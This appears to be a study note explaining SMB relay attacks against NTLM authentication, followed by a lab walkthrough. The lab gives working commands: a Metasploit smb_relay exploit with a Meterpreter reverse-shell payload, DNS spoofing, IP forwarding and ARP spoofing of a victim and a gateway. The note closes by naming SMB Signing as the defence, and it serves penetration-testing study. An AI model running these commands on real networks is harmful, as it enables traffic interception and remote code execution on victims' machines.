# SMB Relay Attack

## Overview

An **SMB Relay Attack** is a technique that allows an attacker to intercept and relay a victim's NTLM authentication to another SMB server without cracking the password or NTLM hash.

Instead of stealing the password, the attacker simply forwards the authentication process to another server, which accepts it as if it came directly from the legitimate user.

This attack is only possible when the target SMB server does **not** require **SMB Signing**.

---

# What is SMB?

**SMB (Server Message Block)** is a Windows protocol used for:

- File sharing
- Printer sharing
- Shared folders
- Remote administration
- Inter-Process Communication (IPC)

---

# Example

When accessing a shared folder such as:

```text
\\SERVER\Documents
```

Windows is communicating using the SMB protocol.

---

# Authentication with NTLM

When a client connects to an SMB server, Windows typically authenticates using **NTLM (NT LAN Manager)**.

The password itself is **never sent** over the network.

---

# How NTLM Authentication Works

## Step 1 – Client Requests Authentication

The client sends its username to the server.

Example:

```text
Username: Ahmed
```

---

## Step 2 – Server Sends a Challenge

The server generates and sends a random challenge.

---

## Step 3 – Client Creates a Response

The client uses the password hash together with the challenge to generate an authentication response.

---

## Step 4 – Server Verifies the Response

If the generated response is valid, access is granted.

---

# Important Note

During NTLM authentication:

- The password is **never transmitted**
- The NTLM hash is **never transmitted directly**

Only the calculated authentication response is sent.

---

# Where Is the Vulnerability?

The weakness lies in the authentication process itself.

An attacker can intercept and **relay** the authentication to another SMB server before it expires.

The attacker does **not** need to know the user's password.

---

# What Is SMB Relay?

A relay attack means forwarding the victim's NTLM authentication to another server.

Instead of cracking the authentication, the attacker simply reuses it.

---

# Example

Victim:

```text
I am Ahmed.
Here is my authentication.
```

Attacker:

```text
I don't understand this authentication,
but I'll forward it to another server.
```

Target Server:

```text
Authentication is valid.
Access granted.
```

The server believes it is communicating directly with the legitimate user.

---

# Why Does This Work?

Some SMB servers do not properly verify the origin of NTLM authentication.

This is especially dangerous when:

```text
SMB Signing = Disabled
```

Without SMB Signing, authentication messages can be relayed between systems.

---

# What Is SMB Signing?

SMB Signing is a security feature that digitally signs SMB packets.

It protects against:

- Packet modification
- Packet tampering
- SMB Relay attacks

If SMB Signing is disabled, relay attacks become possible.

---

# SMB Relay Attack Requirements

A successful SMB Relay attack generally requires:

- SMB Signing disabled on the target server
- Ability to perform a Man-in-the-Middle (MITM) attack
- Victim performing NTLM authentication
- A reachable SMB server that accepts the relayed authentication

---

# Attack Flow

```text
Victim
      │
      │ NTLM Authentication
      ▼
Attacker (MITM)
      │
      │ Relay Authentication
      ▼
Target SMB Server
```

---

# Lab

## Step 1 – Start the SMB Relay Module in Metasploit

```bash
msfconsole

use exploit/windows/smb/smb_relay

set SRVHOST 172.16.5.101
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 172.16.5.101
set SMBHOST 172.16.5.10

exploit
```

### Parameter Description

| Option | Description |
|---------|-------------|
| SRVHOST | IP address of the attacker's fake SMB server |
| LHOST | IP address that will receive the Meterpreter reverse shell |
| SMBHOST | Target SMB server that will receive the relayed authentication |

---

## Step 2 – Create a Fake DNS Record

```bash
echo "172.16.5.101 *.sportsfoo.com" > dns
```

### Purpose

Redirect every request for:

```text
*.sportsfoo.com
```

to the attacker's machine.

Example:

```text
fileserver.sportsfoo.com
```

becomes

```text
172.16.5.101
```

---

## Step 3 – Start DNS Spoofing

```bash
dnsspoof -i eth1 -f dns
```

### Parameters

| Option | Description |
|---------|-------------|
| -i eth1 | Network interface |
| -f dns | Spoofed DNS records file |

This tool sends forged DNS responses so the victim resolves the fake server controlled by the attacker.

---

## Step 4 – Enable IP Forwarding

```bash
echo 1 > /proc/sys/net/ipv4/ip_forward
```

### Purpose

Allows the attacker's machine to forward network traffic between the victim and the gateway.

Without IP forwarding, the victim's connection would be interrupted.

---

## Step 5 – Perform ARP Spoofing

### Spoof the Victim

```bash
arpspoof -i eth1 -t 172.16.5.5 172.16.5.1
```

The attacker tells the victim:

> "I am the gateway."

---

### Spoof the Gateway

```bash
arpspoof -i eth1 -t 172.16.5.1 172.16.5.5
```

The attacker tells the gateway:

> "I am the victim."

---

### Network Addresses

| Address | Device |
|----------|--------|
| 172.16.5.5 | Victim |
| 172.16.5.1 | Gateway |
| 172.16.5.101 | Attacker |

The attacker is now positioned as a **Man-in-the-Middle (MITM)**.

```text
Victim
    ⇄
Attacker
    ⇄
Gateway
```

![](../../../../../Images/Pasted%20image%2020260523134213.png)

---

## Step 6 – Victim Sends DNS Requests

Example:

```text
A? fileserver.sportsfoo.com
```

Instead of receiving the real server's IP address, the attacker responds with:

```text
fileserver.sportsfoo.com = 172.16.5.101
```

The victim now believes the attacker's machine is the legitimate SMB server.

---

## Step 7 – Victim Connects via SMB

The victim automatically performs NTLM authentication to the fake SMB server hosted by the attacker.

---

## Step 8 – SMB Relay Begins

Metasploit captures the NTLM authentication messages:

- NTLM NEGOTIATE
- NTLM CHALLENGE
- NTLM AUTHENTICATE

and immediately relays them to the real SMB server.

If the server does not enforce SMB Signing, authentication succeeds and the payload is executed.

![](../../../../../Images/Pasted%20image%2020260523134233.png)

![](../../../../../Images/Pasted%20image%2020260523134249.png)

![](../../../../../Images/Pasted%20image%2020260523134307.png)

---

# Summary

- SMB is the Windows protocol used for file and printer sharing.
- NTLM authenticates users without sending the password directly.
- SMB Relay does **not** crack passwords or NTLM hashes.
- The attacker forwards the victim's NTLM authentication to another SMB server.
- The attack relies on a **Man-in-the-Middle (MITM)** position.
- **SMB Signing** is the primary protection against SMB Relay attacks.
- If SMB Signing is disabled, servers may accept relayed NTLM authentication, allowing unauthorized access.
